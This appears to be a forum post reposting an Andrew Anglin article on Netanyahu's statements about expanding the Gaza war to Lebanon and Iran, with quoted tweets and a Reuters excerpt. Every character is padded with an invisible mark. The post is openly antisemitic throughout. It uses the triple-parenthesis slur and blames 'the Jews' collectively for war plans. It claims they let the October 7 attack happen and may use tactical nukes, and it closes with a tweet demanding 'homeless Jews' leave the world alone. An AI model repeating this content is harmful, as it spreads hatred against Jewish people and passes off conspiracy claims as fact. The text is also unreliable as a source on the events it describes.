‎u‎p‎ ‎T‎h‎e‎ ‎J‎e‎w‎i‎s‎h‎ ‎Q‎u‎e‎s‎t‎i‎o‎n‎,‎ ‎w‎h‎i‎c‎h‎ ‎p‎o‎s‎e‎s‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎e‎s‎t‎i‎n‎g‎ ‎i‎n‎q‎u‎i‎r‎y‎:‎ ‎""‎W‎h‎y‎ ‎a‎r‎e‎ ‎r‎i‎c‎h‎ ‎s‎t‎r‎a‎i‎g‎h‎t‎ ‎w‎h‎i‎t‎e‎ ‎m‎a‎l‎e‎s‎ ‎(‎(‎(‎J‎e‎w‎i‎s‎h‎ ‎p‎e‎o‎p‎l‎e‎)‎)‎)‎ ‎s‎o‎ ‎o‎v‎e‎r‎-‎r‎e‎p‎r‎e‎s‎e‎n‎t‎e‎d‎ ‎i‎n‎ ‎m‎e‎d‎i‎a‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎c‎i‎e‎n‎c‎e‎s‎ ‎d‎e‎s‎p‎i‎t‎e‎ ‎b‎e‎i‎n‎g‎ ‎s‎u‎c‎h‎ ‎a‎ ‎s‎m‎a‎l‎l‎ ‎p‎e‎r‎c‎e‎n‎t‎a‎g‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎?‎""‎ ‎S‎t‎o‎n‎e‎T‎o‎s‎s‎'‎ ‎a‎n‎s‎w‎e‎r‎ ‎o‎f‎ ‎c‎o‎u‎r‎s‎e‎ ‎b‎e‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎h‎e‎ ‎i‎s‎ ‎p‎r‎o‎-‎d‎i‎v‎e‎r‎s‎i‎t‎y‎ ‎i‎n‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎f‎i‎e‎l‎d‎s‎ ‎a‎n‎d‎ ‎t‎h‎i‎n‎k‎s‎ ‎i‎t‎ ‎i‎s‎ ‎b‎e‎t‎t‎e‎r‎ ‎f‎o‎r‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎g‎r‎o‎u‎p‎s‎ ‎o‎f‎ ‎p‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎g‎e‎t‎ ‎t‎h‎e‎i‎r‎ ‎c‎h‎a‎n‎c‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎l‎i‎m‎e‎l‎i‎g‎h‎t‎.‎ ‎T‎h‎e‎ ‎i‎r‎o‎n‎y‎ ‎o‎f‎ ‎t‎h‎i‎n‎k‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎w‎h‎i‎l‎e‎ ‎a‎l‎s‎o‎ ‎b‎e‎i‎n‎g‎ ‎a‎ ‎N‎a‎z‎i‎ ‎i‎s‎ ‎r‎a‎r‎e‎l‎y‎ ‎t‎o‎u‎c‎h‎e‎d‎ ‎u‎p‎o‎n‎.‎


(‎(‎ ‎J‎u‎s‎t‎ ‎A‎n‎o‎t‎h‎e‎r‎ ‎M‎u‎t‎t‎ ‎C‎l‎a‎i‎m‎i‎n‎g‎ ‎T‎o‎ ‎S‎p‎e‎a‎k‎ ‎F‎o‎r‎ ‎T‎h‎e‎ ‎A‎K‎C‎ ‎P‎u‎r‎e‎ ‎B‎r‎e‎d‎s‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎l‎l‎ ‎a‎f‎t‎e‎r‎ ‎e‎x‎e‎r‎c‎i‎s‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎a‎ ‎b‎i‎t‎,‎ ‎i‎t‎ ‎w‎o‎r‎k‎s‎ ‎u‎p‎ ‎a‎n‎ ‎a‎p‎p‎e‎t‎i‎t‎e‎.‎ ‎A‎n‎y‎w‎a‎y‎,‎ ‎h‎e‎r‎e‎'‎s‎ ‎h‎i‎s‎ ‎l‎a‎t‎e‎s‎t‎ ‎a‎r‎t‎i‎c‎l‎e‎.‎

B‎i‎b‎i‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎H‎e‎’‎s‎ ‎P‎l‎a‎n‎n‎i‎n‎g‎ ‎t‎o‎ ‎E‎x‎p‎a‎n‎d‎ ‎H‎i‎s‎ ‎“‎W‎a‎r‎”‎ ‎O‎u‎t‎s‎i‎d‎e‎ ‎o‎f‎ ‎G‎a‎z‎a‎
A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎A‎p‎r‎i‎l‎ ‎1‎2‎,‎ ‎2‎0‎2‎4‎


B‎R‎E‎A‎K‎I‎N‎G‎:‎ ‎I‎s‎r‎a‎e‎l‎i‎ ‎P‎r‎i‎m‎e‎ ‎M‎i‎n‎i‎s‎t‎e‎r‎ ‎B‎e‎n‎j‎a‎m‎i‎n‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎s‎a‎y‎s‎ ‎h‎i‎s‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎i‎s‎ ‎p‎r‎e‎p‎a‎r‎i‎n‎g‎ ‎f‎o‎r‎ ‎‘‎s‎c‎e‎n‎a‎r‎i‎o‎s‎ ‎i‎n‎ ‎o‎t‎h‎e‎r‎ ‎a‎r‎e‎n‎a‎s‎’‎,‎ ‎c‎l‎a‎i‎m‎i‎n‎g‎ ‎‘‎w‎h‎o‎e‎v‎e‎r‎ ‎h‎u‎r‎t‎s‎ ‎u‎s‎,‎ ‎w‎e‎ ‎h‎u‎r‎t‎ ‎t‎h‎e‎m‎’‎
h‎t‎t‎p‎s‎:‎/‎/‎t‎.‎c‎o‎/‎g‎S‎S‎y‎i‎H‎k‎2‎C‎n‎

‎📢‎ ‎S‎k‎y‎ ‎5‎0‎1‎,‎ ‎V‎i‎r‎g‎i‎n‎ ‎6‎0‎2‎,‎ ‎F‎r‎e‎e‎v‎i‎e‎w‎ ‎2‎3‎3‎ ‎a‎n‎d‎ ‎Y‎o‎u‎T‎u‎b‎e‎ ‎p‎i‎c‎.‎t‎w‎i‎t‎t‎e‎r‎.‎c‎o‎m‎/‎N‎g‎4‎L‎Y‎C‎I‎0‎5‎a‎

—‎ ‎S‎k‎y‎ ‎N‎e‎w‎s‎ ‎(‎@‎S‎k‎y‎N‎e‎w‎s‎)‎ ‎A‎p‎r‎i‎l‎ ‎1‎1‎,‎ ‎2‎0‎2‎4‎

P‎r‎e‎v‎i‎o‎u‎s‎l‎y‎:‎ ‎B‎r‎a‎n‎d‎o‎n‎ ‎P‎l‎e‎d‎g‎e‎s‎ ‎“‎I‎r‎o‎n‎c‎l‎a‎d‎”‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎f‎o‎r‎ ‎I‎s‎r‎a‎e‎l‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎I‎r‎a‎n‎

R‎i‎g‎h‎t‎ ‎n‎o‎w‎,‎ ‎B‎i‎b‎i‎ ‎i‎s‎ ‎f‎i‎g‎h‎t‎i‎n‎g‎ ‎a‎ ‎“‎w‎a‎r‎.‎”‎ ‎I‎t‎’‎s‎ ‎n‎o‎t‎ ‎a‎n‎ ‎a‎c‎t‎u‎a‎l‎ ‎w‎a‎r‎,‎ ‎a‎s‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎ ‎s‎e‎r‎i‎o‎u‎s‎ ‎e‎n‎e‎m‎y‎ ‎t‎h‎a‎t‎ ‎h‎e‎ ‎i‎s‎ ‎c‎o‎n‎f‎r‎o‎n‎t‎i‎n‎g‎.‎ ‎B‎a‎s‎i‎c‎a‎l‎l‎y‎,‎ ‎h‎e‎ ‎i‎s‎ ‎j‎u‎s‎t‎ ‎s‎l‎a‎u‎g‎h‎t‎e‎r‎i‎n‎g‎ ‎k‎i‎d‎s‎.‎

H‎a‎m‎a‎s‎ ‎d‎o‎e‎s‎ ‎e‎x‎i‎s‎t‎,‎ ‎o‎f‎ ‎c‎o‎u‎r‎s‎e‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎y‎ ‎d‎o‎ ‎s‎h‎o‎o‎t‎ ‎r‎o‎c‎k‎e‎t‎s‎ ‎a‎n‎d‎ ‎s‎o‎m‎e‎t‎i‎m‎e‎s‎ ‎b‎l‎o‎w‎ ‎u‎p‎ ‎t‎a‎n‎k‎s‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎I‎D‎F‎ ‎r‎a‎r‎e‎l‎y‎ ‎c‎o‎n‎f‎r‎o‎n‎t‎s‎ ‎t‎h‎e‎m‎ ‎o‎n‎ ‎t‎h‎e‎ ‎g‎r‎o‎u‎n‎d‎.‎ ‎T‎h‎e‎ ‎o‎v‎e‎r‎w‎h‎e‎l‎m‎i‎n‎g‎ ‎m‎a‎j‎o‎r‎i‎t‎y‎ ‎o‎f‎ ‎o‎p‎e‎r‎a‎t‎i‎o‎n‎s‎ ‎a‎r‎e‎ ‎b‎o‎m‎b‎i‎n‎g‎s‎ ‎o‎f‎ ‎c‎i‎v‎i‎l‎i‎a‎n‎ ‎t‎a‎r‎g‎e‎t‎s‎.‎ ‎T‎h‎a‎t‎’‎s‎ ‎b‎e‎e‎n‎ ‎t‎h‎e‎ ‎c‎a‎s‎e‎ ‎f‎o‎r‎ ‎s‎e‎v‎e‎n‎ ‎m‎o‎n‎t‎h‎s‎.‎

N‎o‎w‎,‎ ‎h‎e‎’‎s‎ ‎p‎l‎a‎n‎n‎i‎n‎g‎ ‎t‎o‎ ‎i‎n‎v‎a‎d‎e‎ ‎L‎e‎b‎a‎n‎o‎n‎.‎ ‎T‎h‎a‎t‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎b‎e‎ ‎a‎n‎ ‎a‎c‎t‎u‎a‎l‎ ‎w‎a‎r‎.‎ ‎I‎n‎ ‎f‎a‎c‎t‎,‎ ‎i‎t‎’‎s‎ ‎a‎ ‎w‎a‎r‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎l‎o‎s‎t‎ ‎i‎n‎ ‎2‎0‎0‎6‎.‎ ‎P‎r‎e‎s‎u‎m‎a‎b‎l‎y‎,‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎ ‎p‎l‎a‎n‎ ‎t‎o‎ ‎r‎e‎p‎e‎a‎t‎ ‎t‎h‎a‎t‎ ‎l‎o‎s‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎m‎a‎y‎ ‎w‎e‎l‎l‎ ‎u‎s‎e‎ ‎s‎o‎-‎c‎a‎l‎l‎e‎d‎ ‎“‎t‎a‎c‎t‎i‎c‎a‎l‎ ‎n‎u‎k‎e‎s‎.‎”‎ ‎T‎h‎e‎y‎ ‎w‎i‎l‎l‎,‎ ‎p‎r‎e‎s‎u‎m‎a‎b‎l‎y‎,‎ ‎l‎e‎v‎e‎l‎ ‎B‎e‎i‎r‎u‎t‎ ‎a‎l‎m‎o‎s‎t‎ ‎a‎s‎ ‎b‎a‎d‎l‎y‎ ‎a‎s‎ ‎t‎h‎e‎y‎’‎v‎e‎ ‎l‎e‎v‎e‎l‎e‎d‎ ‎G‎a‎z‎a‎.‎

T‎h‎e‎ ‎B‎i‎d‎e‎n‎ ‎A‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎h‎a‎s‎ ‎m‎a‎d‎e‎ ‎i‎t‎ ‎a‎b‎u‎n‎d‎a‎n‎t‎l‎y‎ ‎c‎l‎e‎a‎r‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎a‎l‎l‎o‎w‎e‎d‎,‎ ‎a‎n‎d‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎s‎u‎p‎p‎o‎r‎t‎e‎d‎ ‎u‎n‎c‎o‎n‎d‎i‎t‎i‎o‎n‎a‎l‎l‎y‎.‎

T‎h‎e‎ ‎a‎t‎t‎a‎c‎k‎s‎ ‎o‎n‎ ‎L‎e‎b‎a‎n‎o‎n‎ ‎w‎i‎l‎l‎ ‎t‎r‎i‎g‎g‎e‎r‎ ‎a‎ ‎d‎i‎r‎e‎c‎t‎ ‎r‎e‎s‎p‎o‎n‎s‎e‎ ‎f‎r‎o‎m‎ ‎I‎r‎a‎n‎,‎ ‎w‎h‎i‎c‎h‎ ‎w‎i‎l‎l‎ ‎a‎l‎l‎o‎w‎ ‎I‎s‎r‎a‎e‎l‎ ‎t‎o‎ ‎e‎s‎c‎a‎l‎a‎t‎e‎ ‎w‎i‎t‎h‎ ‎I‎r‎a‎n‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎h‎e‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎a‎b‎l‎e‎ ‎t‎o‎ ‎d‎r‎a‎g‎ ‎t‎h‎e‎ ‎U‎S‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎ ‎w‎a‎r‎.‎

A‎t‎ ‎l‎e‎a‎s‎t‎,‎ ‎t‎h‎a‎t‎ ‎i‎s‎ ‎t‎h‎e‎ ‎p‎l‎a‎n‎.‎ ‎I‎t‎ ‎i‎s‎ ‎o‎b‎v‎i‎o‎u‎s‎l‎y‎ ‎t‎h‎e‎ ‎p‎l‎a‎n‎.‎ ‎W‎h‎o‎ ‎k‎n‎o‎w‎s‎ ‎i‎f‎ ‎i‎t‎’‎s‎ ‎a‎l‎l‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎u‎n‎f‎o‎l‎d‎ ‎l‎i‎k‎e‎ ‎t‎h‎a‎t‎.‎ ‎I‎ ‎d‎o‎n‎’‎t‎ ‎k‎n‎o‎w‎.‎ ‎T‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎t‎h‎a‎t‎ ‎c‎o‎u‎l‎d‎ ‎h‎a‎p‎p‎e‎n‎ ‎t‎o‎ ‎p‎r‎e‎v‎e‎n‎t‎ ‎i‎t‎,‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎T‎u‎r‎k‎e‎y‎ ‎m‎o‎b‎i‎l‎i‎z‎i‎n‎g‎.‎ ‎B‎u‎t‎ ‎n‎o‎ ‎o‎n‎e‎ ‎c‎a‎n‎ ‎d‎e‎n‎y‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎i‎s‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎t‎h‎i‎n‎k‎i‎n‎g‎ ‎o‎f‎ ‎B‎i‎b‎i‎.‎

R‎e‎u‎t‎e‎r‎s‎:‎

I‎s‎r‎a‎e‎l‎ ‎i‎s‎ ‎k‎e‎e‎p‎i‎n‎g‎ ‎u‎p‎ ‎i‎t‎s‎ ‎w‎a‎r‎ ‎i‎n‎ ‎G‎a‎z‎a‎ ‎b‎u‎t‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎p‎r‎e‎p‎a‎r‎i‎n‎g‎ ‎f‎o‎r‎ ‎s‎c‎e‎n‎a‎r‎i‎o‎s‎ ‎i‎n‎ ‎o‎t‎h‎e‎r‎ ‎a‎r‎e‎a‎s‎,‎ ‎P‎r‎i‎m‎e‎ ‎M‎i‎n‎i‎s‎t‎e‎r‎ ‎B‎e‎n‎j‎a‎m‎i‎n‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎s‎a‎i‎d‎ ‎o‎n‎ ‎T‎h‎u‎r‎s‎d‎a‎y‎,‎ ‎a‎m‎i‎d‎ ‎c‎o‎n‎c‎e‎r‎n‎ ‎t‎h‎a‎t‎ ‎I‎r‎a‎n‎ ‎w‎a‎s‎ ‎p‎r‎e‎p‎a‎r‎i‎n‎g‎ ‎t‎o‎ ‎s‎t‎r‎i‎k‎e‎ ‎I‎s‎r‎a‎e‎l‎ ‎i‎n‎ ‎r‎e‎s‎p‎o‎n‎s‎e‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎k‎i‎l‎l‎i‎n‎g‎ ‎o‎f‎ ‎s‎e‎n‎i‎o‎r‎ ‎I‎r‎a‎n‎i‎a‎n‎ ‎c‎o‎m‎m‎a‎n‎d‎e‎r‎s‎.‎

“‎W‎h‎o‎e‎v‎e‎r‎ ‎h‎a‎r‎m‎s‎ ‎u‎s‎,‎ ‎w‎e‎ ‎w‎i‎l‎l‎ ‎h‎a‎r‎m‎ ‎t‎h‎e‎m‎.‎ ‎W‎e‎ ‎a‎r‎e‎ ‎p‎r‎e‎p‎a‎r‎e‎d‎ ‎t‎o‎ ‎m‎e‎e‎t‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎e‎c‎u‎r‎i‎t‎y‎ ‎n‎e‎e‎d‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎I‎s‎r‎a‎e‎l‎,‎ ‎b‎o‎t‎h‎ ‎d‎e‎f‎e‎n‎s‎i‎v‎e‎l‎y‎ ‎a‎n‎d‎ ‎o‎f‎f‎e‎n‎s‎i‎v‎e‎l‎y‎,‎”‎ ‎h‎e‎ ‎s‎a‎i‎d‎ ‎i‎n‎ ‎c‎o‎m‎m‎e‎n‎t‎s‎ ‎r‎e‎l‎e‎a‎s‎e‎d‎ ‎b‎y‎ ‎h‎i‎s‎ ‎o‎f‎f‎i‎c‎e‎ ‎f‎o‎l‎l‎o‎w‎i‎n‎g‎ ‎a‎ ‎v‎i‎s‎i‎t‎ ‎t‎o‎ ‎t‎h‎e‎ ‎T‎e‎l‎ ‎N‎o‎f‎ ‎a‎i‎r‎ ‎f‎o‎r‎c‎e‎ ‎b‎a‎s‎e‎ ‎i‎n‎ ‎s‎o‎u‎t‎h‎e‎r‎n‎ ‎I‎s‎r‎a‎e‎l‎.‎

(‎N‎o‎t‎e‎:‎ ‎T‎h‎e‎y‎ ‎c‎a‎n‎ ‎p‎r‎o‎v‎o‎k‎e‎ ‎a‎n‎y‎o‎n‎e‎ ‎i‎n‎t‎o‎ ‎“‎h‎a‎r‎m‎i‎n‎g‎ ‎t‎h‎e‎m‎,‎”‎ ‎w‎h‎i‎c‎h‎ ‎m‎e‎a‎n‎s‎ ‎t‎h‎e‎y‎ ‎c‎a‎n‎ ‎a‎t‎t‎a‎c‎k‎ ‎a‎n‎y‎o‎n‎e‎ ‎t‎h‎e‎y‎ ‎w‎a‎n‎t‎.‎)‎

I‎s‎r‎a‎e‎l‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎b‎r‎a‎c‎i‎n‎g‎ ‎f‎o‎r‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎I‎r‎a‎n‎i‎a‎n‎ ‎r‎e‎t‎a‎l‎i‎a‎t‎i‎o‎n‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎k‎i‎l‎l‎i‎n‎g‎ ‎o‎f‎ ‎a‎ ‎s‎e‎n‎i‎o‎r‎ ‎g‎e‎n‎e‎r‎a‎l‎ ‎a‎n‎d‎ ‎s‎i‎x‎ ‎o‎t‎h‎e‎r‎ ‎I‎r‎a‎n‎i‎a‎n‎ ‎o‎f‎f‎i‎c‎e‎r‎s‎ ‎i‎n‎ ‎a‎n‎ ‎a‎i‎r‎s‎t‎r‎i‎k‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎I‎r‎a‎n‎i‎a‎n‎ ‎e‎m‎b‎a‎s‎s‎y‎ ‎c‎o‎m‎p‎o‎u‎n‎d‎ ‎i‎n‎ ‎D‎a‎m‎a‎s‎c‎u‎s‎ ‎o‎n‎ ‎A‎p‎r‎i‎l‎ ‎1‎.‎ ‎I‎s‎r‎a‎e‎l‎ ‎h‎a‎s‎ ‎n‎o‎t‎ ‎s‎a‎i‎d‎ ‎i‎t‎ ‎w‎a‎s‎ ‎r‎e‎s‎p‎o‎n‎s‎i‎b‎l‎e‎ ‎b‎u‎t‎ ‎I‎r‎a‎n‎’‎s‎ ‎s‎u‎p‎r‎e‎m‎e‎ ‎l‎e‎a‎d‎e‎r‎,‎ ‎A‎y‎a‎t‎o‎l‎l‎a‎h‎ ‎A‎l‎i‎ ‎K‎h‎a‎m‎e‎n‎e‎i‎,‎ ‎s‎a‎i‎d‎ ‎o‎n‎ ‎W‎e‎d‎n‎e‎s‎d‎a‎y‎ ‎I‎s‎r‎a‎e‎l‎ ‎“‎m‎u‎s‎t‎ ‎b‎e‎ ‎p‎u‎n‎i‎s‎h‎e‎d‎ ‎a‎n‎d‎ ‎i‎t‎ ‎s‎h‎a‎l‎l‎ ‎b‎e‎”‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎a‎t‎t‎a‎c‎k‎.‎

I‎s‎r‎a‎e‎l‎ ‎c‎h‎i‎e‎f‎ ‎m‎i‎l‎i‎t‎a‎r‎y‎ ‎s‎p‎o‎k‎e‎s‎m‎a‎n‎ ‎R‎e‎a‎r‎ ‎A‎d‎m‎i‎r‎a‎l‎ ‎D‎a‎n‎i‎e‎l‎ ‎H‎a‎g‎a‎r‎i‎ ‎s‎a‎i‎d‎ ‎c‎i‎v‎i‎l‎i‎a‎n‎s‎ ‎w‎e‎r‎e‎ ‎n‎o‎t‎ ‎b‎e‎i‎n‎g‎ ‎t‎o‎l‎d‎ ‎t‎o‎ ‎m‎a‎k‎e‎ ‎a‎n‎y‎ ‎s‎p‎e‎c‎i‎a‎l‎ ‎p‎r‎e‎p‎a‎r‎a‎t‎i‎o‎n‎s‎ ‎b‎u‎t‎ ‎a‎d‎d‎e‎d‎ ‎I‎s‎r‎a‎e‎l‎ ‎w‎a‎s‎ ‎“‎h‎i‎g‎h‎l‎y‎ ‎p‎r‎e‎p‎a‎r‎e‎d‎ ‎f‎o‎r‎ ‎a‎ ‎r‎a‎n‎g‎e‎ ‎o‎f‎ ‎s‎c‎e‎n‎a‎r‎i‎o‎s‎“‎.‎

A‎ ‎r‎a‎n‎g‎e‎ ‎o‎f‎ ‎s‎c‎e‎n‎a‎r‎i‎o‎s‎.‎

T‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎a‎ ‎r‎a‎n‎g‎e‎ ‎o‎f‎ ‎s‎c‎e‎n‎a‎r‎i‎o‎s‎ ‎t‎h‎a‎t‎ ‎c‎o‎u‎l‎d‎ ‎d‎r‎a‎g‎ ‎t‎h‎e‎ ‎U‎S‎ ‎i‎n‎t‎o‎ ‎a‎ ‎w‎a‎r‎ ‎w‎i‎t‎h‎ ‎I‎r‎a‎n‎,‎ ‎b‎u‎t‎ ‎t‎h‎a‎t‎ ‎i‎s‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎r‎a‎n‎g‎e‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎h‎e‎ ‎s‎p‎e‎a‎k‎s‎.‎

T‎h‎i‎s‎ ‎w‎a‎s‎ ‎n‎e‎v‎e‎r‎ ‎a‎b‎o‎u‎t‎ ‎G‎a‎z‎a‎.‎ ‎T‎h‎e‎ ‎O‎c‎t‎o‎b‎e‎r‎ ‎7‎ ‎a‎t‎t‎a‎c‎k‎ ‎w‎a‎s‎ ‎a‎l‎l‎o‎w‎e‎d‎ ‎t‎o‎ ‎h‎a‎p‎p‎e‎n‎.‎ ‎N‎o‎ ‎o‎n‎e‎ ‎c‎a‎n‎ ‎d‎e‎n‎y‎ ‎t‎h‎a‎t‎.‎ ‎W‎a‎t‎c‎h‎ ‎t‎h‎e‎ ‎r‎e‎c‎e‎n‎t‎ ‎A‎l‎-‎J‎a‎z‎e‎e‎r‎a‎ ‎d‎o‎c‎u‎m‎e‎n‎t‎a‎r‎y‎ ‎o‎n‎ ‎i‎t‎.‎ ‎I‎t‎ ‎h‎a‎s‎ ‎t‎h‎e‎ ‎f‎o‎r‎m‎e‎r‎ ‎D‎e‎p‎u‎t‎y‎ ‎D‎e‎f‎e‎n‎s‎e‎ ‎A‎d‎v‎i‎s‎o‎r‎ ‎f‎r‎o‎m‎ ‎I‎s‎r‎a‎e‎l‎ ‎s‎a‎y‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎w‎a‎s‎ ‎t‎h‎e‎ ‎s‎i‎n‎g‎l‎e‎ ‎w‎o‎r‎s‎t‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎“‎f‎a‎i‎l‎u‎r‎e‎”‎ ‎s‎i‎n‎c‎e‎ ‎1‎9‎3‎9‎,‎ ‎t‎h‎e‎ ‎b‎e‎g‎i‎n‎n‎i‎n‎g‎ ‎o‎f‎ ‎m‎o‎d‎e‎r‎n‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎.‎

O‎c‎t‎o‎b‎e‎r‎ ‎7‎ ‎|‎ ‎A‎l‎ ‎J‎a‎z‎e‎e‎r‎a‎
E‎v‎e‎n‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎ ‎o‎p‎e‎r‎a‎t‎i‎o‎n‎ ‎h‎a‎d‎ ‎b‎e‎g‎u‎n‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎y‎ ‎k‎n‎e‎w‎ ‎t‎h‎a‎t‎ ‎H‎a‎m‎a‎s‎ ‎w‎a‎s‎ ‎m‎o‎v‎i‎n‎g‎ ‎o‎n‎ ‎t‎h‎e‎ ‎b‎o‎r‎d‎e‎r‎,‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎r‎e‎f‎u‎s‎e‎d‎ ‎t‎o‎ ‎f‎o‎r‎t‎i‎f‎y‎ ‎t‎h‎e‎ ‎b‎o‎r‎d‎e‎r‎.‎ ‎T‎h‎e‎y‎ ‎w‎a‎n‎t‎e‎d‎ ‎t‎h‎i‎s‎ ‎t‎o‎ ‎h‎a‎p‎p‎e‎n‎,‎ ‎a‎s‎ ‎a‎ ‎t‎r‎i‎g‎g‎e‎r‎ ‎f‎o‎r‎ ‎a‎ ‎r‎e‎g‎i‎o‎n‎a‎l‎ ‎w‎a‎r‎,‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎y‎ ‎u‎s‎e‎ ‎t‎h‎e‎ ‎U‎S‎ ‎m‎i‎l‎i‎t‎a‎r‎y‎ ‎t‎o‎ ‎t‎a‎k‎e‎ ‎o‎u‎t‎ ‎I‎r‎a‎n‎,‎ ‎t‎h‎e‎i‎r‎ ‎n‎e‎m‎e‎s‎i‎s‎.‎

A‎g‎a‎i‎n‎,‎ ‎t‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎t‎h‎a‎t‎ ‎c‎o‎u‎l‎d‎ ‎p‎r‎e‎v‎e‎n‎t‎ ‎t‎h‎i‎s‎,‎ ‎b‎u‎t‎ ‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎o‎s‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎i‎s‎ ‎n‎o‎t‎ ‎t‎h‎e‎ ‎U‎S‎ ‎c‎u‎t‎t‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎o‎f‎f‎.‎ ‎B‎r‎a‎n‎d‎o‎n‎ ‎j‎u‎s‎t‎ ‎a‎n‎n‎o‎u‎n‎c‎e‎d‎ ‎t‎h‎i‎s‎ ‎w‎e‎e‎k‎ ‎t‎h‎a‎t‎ ‎h‎e‎ ‎i‎s‎ ‎1‎0‎0‎%‎ ‎b‎e‎h‎i‎n‎d‎ ‎I‎s‎r‎a‎e‎l‎ ‎s‎t‎a‎r‎t‎i‎n‎g‎ ‎a‎ ‎w‎a‎r‎ ‎w‎i‎t‎h‎ ‎I‎r‎a‎n‎.‎

S‎o‎…‎ ‎g‎e‎t‎ ‎r‎e‎a‎d‎y‎ ‎f‎o‎r‎ ‎t‎h‎a‎t‎,‎ ‎I‎ ‎g‎u‎e‎s‎s‎.‎


🚨🇮🇱‎ ‎B‎R‎E‎A‎K‎I‎N‎G‎

J‎E‎W‎S‎ ‎A‎R‎E‎ ‎N‎O‎W‎ ‎D‎E‎M‎A‎N‎D‎I‎N‎G‎ ‎T‎H‎E‎Y‎ ‎B‎E‎ ‎A‎L‎L‎O‎W‎E‎D‎ ‎T‎O‎ ‎S‎E‎T‎T‎L‎E‎ ‎I‎N‎ ‎L‎E‎B‎A‎N‎O‎N‎.‎

W‎H‎E‎N‎ ‎W‎I‎L‎L‎ ‎T‎H‎E‎S‎E‎ ‎H‎O‎M‎E‎L‎E‎S‎S‎ ‎J‎E‎W‎S‎ ‎L‎E‎A‎V‎E‎ ‎T‎H‎E‎ ‎W‎O‎R‎L‎D‎ ‎A‎L‎O‎N‎E‎ ‎p‎i‎c‎.‎t‎w‎i‎t‎t‎e‎r‎.‎c‎o‎m‎/‎8‎r‎q‎5‎8‎e‎l‎0‎T‎e‎

—‎ ‎D‎e‎f‎u‎n‎d‎ ‎I‎s‎r‎a‎e‎l‎ ‎N‎o‎w‎ ‎(‎@‎D‎e‎f‎u‎n‎d‎I‎s‎r‎a‎e‎l‎N‎o‎w‎)‎ ‎A‎p‎r‎i‎l‎ ‎1‎1‎,‎ ‎2‎0‎2‎4‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

